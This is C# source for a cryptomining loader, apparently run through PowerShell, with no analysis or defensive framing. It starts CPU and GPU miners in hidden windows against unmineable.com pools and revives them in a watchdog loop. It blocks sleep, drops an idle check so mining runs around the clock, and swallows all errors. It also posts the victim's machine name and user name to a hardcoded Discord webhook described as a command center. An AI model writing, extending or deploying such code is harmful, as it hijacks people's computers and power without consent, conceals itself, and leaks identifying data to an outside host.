using System;
using System.Diagnostics;
using System.Net;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

public class DateFundLoader {

    [StructLayout(LayoutKind.Sequential)]
    struct LASTINPUTINFO {
        public static readonly int SizeOf = Marshal.SizeOf(typeof(LASTINPUTINFO));
        [MarshalAs(UnmanagedType.U4)]
        public int cbSize;
        [MarshalAs(UnmanagedType.U4)]
        public uint dwTime;
    }

    [DllImport("user32.dll")]
    static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern uint SetThreadExecutionState(uint esFlags);

    private const uint ES_CONTINUOUS = 0x80000000;
    private const uint ES_SYSTEM_REQUIRED = 0x00000001;
    private const uint ES_AWAYMODE_REQUIRED = 0x00000040;

    public static void StartMiner(string cpuMinerPath, string gpuMinerPath, string wallet) {
        try {
            // Keep the system awake and prevent hibernation/sleep
            SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_AWAYMODE_REQUIRED);
            
            // Notify Mezo's command center
            NotifyDiscord(wallet);

            // 1. Start the CPU Miner Watchdog (Immortal feature)
            Thread cpuThread = new Thread(() => MonitorAndReviveCpu(cpuMinerPath, wallet));
            cpuThread.IsBackground = true;
            cpuThread.Start();

            // 2. Start the Idle Monitor for the GPU Miner
            if (!string.IsNullOrEmpty(gpuMinerPath) && File.Exists(gpuMinerPath)) {
                Thread gpuThread = new Thread(() => MonitorIdleAndMine(gpuMinerPath, wallet));
                gpuThread.IsBackground = true;
                gpuThread.Start();
            }

            // 3. Block PowerShell from exiting so our watchdogs can run forever
            Thread.Sleep(Timeout.Infinite);
        } catch (Exception) {
            // Silently fail
        }
    }

    private static void MonitorAndReviveCpu(string cpuMinerPath, string wallet) {
        string args = string.Format("-o rx.unmineable.com:3333 -u BTC:{0}.ENI_LO_CPU -p x --donate-level 1 --cpu-max-threads-hint 100", wallet);
        string procName = Path.GetFileNameWithoutExtension(cpuMinerPath);
        
        while (true) {
            try {
                Process[] existing = Process.GetProcessesByName(procName);
                if (existing.Length == 0) {
                    ProcessStartInfo startInfo = new ProcessStartInfo(cpuMinerPath);
                    startInfo.Arguments = args;
                    startInfo.CreateNoWindow = true;
                    startInfo.UseShellExecute = false;
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    Process.Start(startInfo);
                }
            } catch { }
            Thread.Sleep(3000); // Check every 3 seconds
        }
    }

    private static void MonitorIdleAndMine(string gpuMinerPath, string wallet) {
        Process gpuProcess = null;

        while (true) {
            // User activity check removed per Mezo's request for max profits - 24/7 mining
            if (gpuProcess == null || gpuProcess.HasExited) {
                try {
                    ProcessStartInfo startInfo = new ProcessStartInfo(gpuMinerPath);
                    startInfo.Arguments = string.Format("--algo ETCHASH --server etchash.unmineable.com:3333 --user BTC:{0}.ENI_LO_GPU --pass x", wallet);
                    startInfo.CreateNoWindow = true;
                    startInfo.UseShellExecute = false;
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    gpuProcess = Process.Start(startInfo);
                } catch { }
            }

            Thread.Sleep(5000); 
        }
    }

    private static void NotifyDiscord(string wallet) {
        try {
            string webhookUrl = "https://discord.com/api/webhooks/1495748321078284358/ZrPnFP_wT81nNxuqlsAOB9FNWrOJhK3nPGRYQJjDuH-2mIWdyNf1RK_Ql9Quf6vSgbKr";
            string compName = Environment.MachineName;
            string userName = Environment.UserName;
            string msg = string.Format("🚀 **New Worker Alive!**\n**Host:** `{0}`\n**User:** `{1}`\n**Wallet:** `{2}`\n**Status:** Fully Optimized (100% CPU + 24/7 GPU + Anti-Sleep)", compName, userName, wallet);
            
            using (WebClient wc = new WebClient()) {
                wc.Headers[HttpRequestHeader.ContentType] = "application/json";
                string json = "{\"content\": \"" + msg + "\"}";
                wc.UploadString(webhookUrl, json);
            }
        } catch { }
    }

    private static uint GetIdleTime() {
        LASTINPUTINFO lastInputInfo = new LASTINPUTINFO();
        lastInputInfo.cbSize = Marshal.SizeOf(lastInputInfo);
        lastInputInfo.dwTime = 0;

        if (GetLastInputInfo(ref lastInputInfo)) {
            return (uint)Environment.TickCount - lastInputInfo.dwTime;
        }

        return 0;
    }
}
